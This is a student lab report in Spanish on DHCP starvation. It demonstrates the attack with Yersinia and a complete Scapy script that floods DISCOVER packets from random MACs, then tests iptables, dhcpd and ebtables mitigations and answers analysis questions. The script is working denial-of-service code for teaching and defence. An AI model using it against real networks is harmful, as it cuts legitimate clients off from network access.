# ACT5 · Protocolo DHCP - Simulación DHCP Starvation

| | |
| --- | --- |
| **Práctica** | Protocolo DHCP - Simulación DHCP Starvation |
| **Módulo** | 037 Seguridad en servicios |
| **Ciclo Formativo** | ASIX |
| **Alumno** | Abdellah Chahmi |

## Objetivo

El objetivo de esta actividad es comprender el impacto del agotamiento del direccionamiento IP dinámico en una LAN y aprender a proteger la infraestructura:

- Comprender el intercambio de mensajes del protocolo DHCP (DISCOVER, OFFER, REQUEST, ACK).
- Demostrar cómo un atacante puede agotar un pool de direcciones IPv4 (Starvation) simulando múltiples clientes falsos.
- Analizar el tráfico malicioso con Wireshark para identificar patrones de ataque (variación de la dirección MAC en la trama Ethernet frente al campo `chaddr` del payload DHCP).
- Implementar mitigaciones en el servidor: limitación de tasa (rate limiting) e iptables/ebtables, equivalentes en nuestro entorno a lo que un switch de acceso haría con DHCP Snooping y Port Security.

## Entorno de laboratorio

Tres máquinas virtuales en VirtualBox:

- **VM 1 — Atacante:** Kali Linux, con Scapy y Yersinia.
- **VM 2 — Servidor DHCP:** Debian/Ubuntu Server con `isc-dhcp-server`, con un pool restringido.
- **VM 3 — Cliente legítimo:** Ubuntu/Debian Desktop.

## Configuración de red

**VM 1 — Atacante (Kali Linux):** adaptador en modo Red Interna, con "Modo Promiscuo" en Permitir todo (Allow All). Esto es imprescindible para que Kali pueda enviar y recibir tramas Ethernet con direcciones MAC falsificadas que no corresponden a su interfaz física.

**VM 2 — Servidor (Debian/Ubuntu Server):** adaptador 1 en NAT (para tener Internet y poder instalar `isc-dhcp-server`), adaptador 2 en modo Red Interna, con "Modo Promiscuo" en Permitir todo.

**VM 3 — Cliente (Ubuntu/Debian):** adaptador en modo Red Interna, con "Modo Promiscuo" en Permitir todo.

Configuración de los tres adaptadores de red en VirtualBox:

<img width="802" height="535" alt="image" src="https://github.com/user-attachments/assets/6706ca9d-5306-4878-854c-d1906c2b76de" />


---

## Pruebas de funcionamiento normal

Desde la VM 3, forzamos la solicitud DHCP:

```bash
sudo dhclient -v enp0s3
```

Verificamos la asignación:

```bash
ip a
```

<img width="601" height="348" alt="image" src="https://github.com/user-attachments/assets/326cbf2f-b223-4de3-99d3-b9713c061a67" />


Desde la VM 2, comprobamos las asignaciones en caliente:

```bash
cat /var/lib/dhcp/dhcpd.leases
```
<img width="710" height="173" alt="image" src="https://github.com/user-attachments/assets/955d5776-3a11-4dfc-9354-b608a5db8fa7" />


**¿Qué tendríamos que hacer si queremos monitorizar la red con Wireshark?** Habría que abrir Wireshark en una de las máquinas con visibilidad sobre el segmento (en nuestro caso, en Kali, gracias al modo promiscuo activado en la Red Interna), seleccionar la interfaz conectada a esa red y aplicar un filtro `dns` → en este caso `bootp || dhcp`, para quedarnos solo con el tráfico DHCP y poder distinguir los cuatro mensajes del DORA.

---

## Ejecutar el ataque de agotamiento (VM 1 — Kali Linux)

### Método A: Yersinia

Instalación, si hace falta:

```bash
sudo apt update && sudo apt install -y yersinia
```

Lanzamos la herramienta en modo interactivo:

```bash
sudo yersinia -I
```

Dentro: `g` para seleccionar el protocolo DHCP, `x` para listar ataques y elegimos la opción de envío de paquetes DISCOVER. Lo dejamos actuar unos 15 segundos y pulsamos `L` para detener.

![Yersinia generando DHCPDISCOVER con MACs aleatorias](imagenes/act5-yersinia-ataque.png)

### Método B: script en Python con Scapy

Creamos en Kali el script `starvation.py`:

```python
#!/usr/bin/env python3
import sys
import time
from scapy.all import *
conf.verb = 0
interface = "eth0"  # Validar nombre en tu Kali
print(f"[*] Lanzando DHCP Starvation sobre {interface}...")

try:
    while True:
        rand_mac = RandMAC()
        mac_bytes = mac2str(rand_mac)
        pkt = (Ether(dst="ff:ff:ff:ff:ff:ff", src=rand_mac) /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(chaddr=mac_bytes, xid=RandInt()) /
               DHCP(options=[("message-type", "discover"), "end"]))
        sendp(pkt, iface=interface, count=1)
        time.sleep(0.005)
except KeyboardInterrupt:
    print("\nAtaque finalizado.")
```

Lo ejecutamos con permisos de root:

```bash
sudo python3 starvation.py
```

![Script starvation.py en ejecución](imagenes/act5-scapy-ataque.png)

---

## Validación del impacto del ataque

En la VM 2, consultamos el número de leases asignados de golpe:

```bash
cat /var/lib/dhcp/dhcpd.leases | grep "lease " | wc -l
```

![Pool de direcciones agotado](imagenes/act5-leases-agotado.png)

En la VM 3, liberamos e intentamos solicitar una IP:

```bash
sudo dhclient -r eth0
sudo dhclient -v eth0
```

![Cliente en bucle sin recibir respuesta](imagenes/act5-cliente-sin-ip.png)

---

## Mitigación

**¿Qué es el DHCP Snooping y cómo se configuraría?** Es una función de los switches de acceso que clasifica cada puerto como *trusted* (de confianza, por donde se permite tráfico de servidor: DHCPOFFER, DHCPACK) o *untrusted* (el resto de puertos, donde solo se permite tráfico propio de cliente: DHCPDISCOVER, DHCPREQUEST). Se configuraría activando la función globalmente (`ip dhcp snooping`), indicando las VLANs donde aplica, y marcando como *trusted* únicamente el puerto por el que llega el servidor DHCP legítimo; el switch construye además una tabla (*binding database*) con la MAC, la IP, el puerto y la VLAN de cada concesión vista, que usa para validar tráfico posterior (por ejemplo, con IP Source Guard o Dynamic ARP Inspection). En nuestro laboratorio no tenemos un switch gestionable, así que emulamos su efecto con `iptables` y `ebtables` en el propio servidor Linux.

**¿Qué tipo de mitigación podemos implementar en un servidor Linux?** Un filtrado por tasa de peticiones en el kernel (iptables/nftables), y un control de coherencia entre la MAC de Ethernet y el `chaddr` del payload DHCP (ebtables o configuración del propio `dhcpd`).

### Mitigación A: Rate Limiting de peticiones DHCP

```bash
sudo iptables -A INPUT -i eth1 -p udp --dport 67 \
  -m hashlimit --hashlimit-name dhcp_limit \
  --hashlimit-above 3/sec --hashlimit-burst 5 \
  --hashlimit-mode srcmac --hashlimit-htable-expire 10000 \
  -j DROP
```

![Regla de hashlimit aplicada](imagenes/act5-iptables-hashlimit.png)

### Mitigación B: impedir el abuso por falsificación de `chaddr`

Editamos la configuración del daemon DHCP en la VM 2:

```bash
sudo nano /etc/dhcp/dhcpd.conf
```

Y añadimos:

```
deny unknown-clients;
```

![Configuración dhcpd.conf con deny unknown-clients](imagenes/act5-dhcpd-conf-deny.png)

---

## Probar la defensa

En la VM 2, liberamos el pool para tener espacio de pruebas:

```bash
sudo systemctl stop isc-dhcp-server
sudo rm /var/lib/dhcp/dhcpd.leases
sudo touch /var/lib/dhcp/dhcpd.leases
sudo systemctl start isc-dhcp-server
```

Ejecutamos de nuevo `starvation.py` en Kali y observamos las estadísticas de rechazo en el firewall del servidor:

```bash
sudo iptables -L INPUT -v -n
```

![Contador de paquetes bloqueados por hashlimit](imagenes/act5-iptables-contador.png)

En la VM 3, intentamos conseguir una IP:

```bash
sudo dhclient -v enp0s3
```

![Cliente legítimo obteniendo IP tras la mitigación](imagenes/act5-cliente-ip-tras-mitigacion.png)

---

## Preguntas

**Análisis de Capas:** un atacante de DHCP Starvation debe alterar a la vez la MAC Ethernet (L2) y el campo `chaddr` (L7) porque son dos mecanismos de identificación distintos que usan capas distintas del sistema. El servidor DHCP (en espacio de usuario) decide qué IP asignar y cuenta las concesiones usando el `chaddr`, mientras que un switch o un firewall de Capa 2 (como Port Security) solo ve y cuenta la MAC de la trama Ethernet. Si solo se cambia el `chaddr` (manteniendo siempre la misma MAC de Ethernet), el servidor sí concederá IPs distintas y el pool se agotará igualmente, pero cualquier defensa de Capa 2 que cuente MACs por puerto (Port Security) no detectará nada anómalo, porque seguirá viendo una sola MAC. Si solo se cambia la MAC de Ethernet pero se deja siempre el mismo `chaddr`, el servidor DHCP identificará todas las peticiones como del mismo cliente y, en la mayoría de los casos, le irá renovando o reasignando la misma IP en vez de ir gastando IPs nuevas del pool, por lo que el ataque de agotamiento no sería efectivo a nivel de servidor. Por eso, para que el ataque funcione de verdad contra el servidor y además pase desapercibido para las defensas de Capa 2, hace falta cambiar los dos campos a la vez y de forma coherente entre sí.

**Impacto en Entornos Virtuales:** sin el modo promiscuo activado en la Red Interna de VirtualBox, el ataque no habría tenido éxito, al menos no de forma completa. Scapy podría seguir construyendo y enviando tramas con una MAC de origen falsa, porque eso no depende del modo promiscuo (afecta a lo que se envía, no a lo que se recibe), pero el adaptador de Kali, al no estar en modo promiscuo, descartaría cualquier trama que le llegara dirigida a una de esas MACs inventadas en lugar de a su MAC real. Como el DORA necesita que el cliente reciba el DHCPOFFER y el DHCPACK de vuelta, y en este ataque esas respuestas van dirigidas a MACs falsas distintas de la real de Kali, sin modo promiscuo esas respuestas nunca llegarían a procesarse, y el servidor acabaría concediendo las IPs sin que el atacante llegara a confirmarlas con un DHCPREQUEST completo.

**Optimización con Linux Bridge:** en un bridge Linux (`br0`), `ebtables` podría colocarse para interceptar las tramas DHCP a su paso por el bridge y comparar dos valores: la MAC de origen de la cabecera Ethernet y el campo `chaddr` que va dentro del payload BOOTP/DHCP. `ebtables` por sí solo no sabe inspeccionar el contenido de un payload DHCP con tanto detalle como un firewall de aplicación, así que en la práctica esta validación se suele resolver combinando `ebtables` (para filtrar por lo que sí ve, la MAC de Capa 2, por ejemplo limitando cuántas tramas DHCP de distintas MACs se permiten por puerto/interfaz) con una regla específica a nivel de aplicación en el propio servidor DHCP (como la opción `deny unknown-clients` ya aplicada, o un script que compare ambos campos). Una regla básica de `ebtables` para limitar tramas DHCP (puerto 67/68) entrantes por una interfaz del bridge, a modo de ejemplo de control de Capa 2 equivalente al Rate Limiting ya aplicado con `iptables`, sería:

```bash
sudo ebtables -A FORWARD -i eth1 -p IPv4 --ip-proto udp --ip-dport 67 -j DROP
```

(Esta regla descarta directamente todo el tráfico DHCP entrante por esa interfaz del bridge; para una validación real de MAC-contra-chaddr haría falta un módulo o script externo que decodifique el payload BOOTP, ya que `ebtables` no tiene de serie un match para el campo `chaddr`.)

**Resistencia de la Mitigación:** la regla `-m hashlimit --hashlimit-mode srcmac` cuenta las peticiones agrupándolas por la MAC de origen de cada paquete. Si el atacante falsea también por completo la MAC de Capa 2 en cada envío (como hace nuestro script `starvation.py`, que genera una MAC aleatoria distinta en cada paquete), cada petición entra en el límite de tasa como si viniera de un origen distinto y nunca nuevo, así que el límite por `srcmac` prácticamente no frena nada: cada MAC nueva dispone de su propio cupo de 3 peticiones/segundo, y con miles de MACs distintas el conjunto de peticiones que llegan al servidor sigue siendo enorme. Para mitigar esta variante haría falta un límite que no dependa de identificar correctamente al atacante por MAC, sino que limite el conjunto total de tráfico DHCP entrante a la interfaz, independientemente de cuántas MACs u orígenes distintos se usen (por ejemplo, con `--hashlimit-mode` sin agrupar por MAC/IP, o con el módulo `limit` global de iptables), combinado con `deny unknown-clients` en el propio `dhcpd` y, si se dispusiera de un switch real, con Port Security limitando cuántas MACs distintas puede anunciar un mismo puerto físico, que es precisamente el control que un simple filtro por software no puede replicar del todo porque no ve la capa física real.

---

## Links

- Scapy: https://www.kali.org/tools/scapy/
- DHCP starvation with Scapy: https://cabeggar.github.io/2016/02/21/DHCP-starvation-with-ScaPy/
